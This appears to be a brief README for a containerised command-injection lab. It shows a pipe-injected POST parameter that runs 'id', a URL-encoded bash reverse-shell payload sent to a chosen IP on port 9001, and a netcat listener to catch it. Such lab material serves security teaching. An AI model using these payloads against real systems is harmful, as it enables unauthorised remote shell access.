## Getting started

```
$ docker compose up
```

## Evaluation

The host has a webserver open on 8080.

## Website

We can execute commands with the following POST parameters to index.

```
number=124|echo $(id)&format=hex
```

We can use this to get a reverse shell like this (replace 172.17.0.1 with your IP):
```
number=10%20%7Cbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F9001%200%3E%261%27%3Becho%20A&format=hex
```

Before making the request, listen for a reverse shell

```
$ nc -lnvp 9001 # on host
```

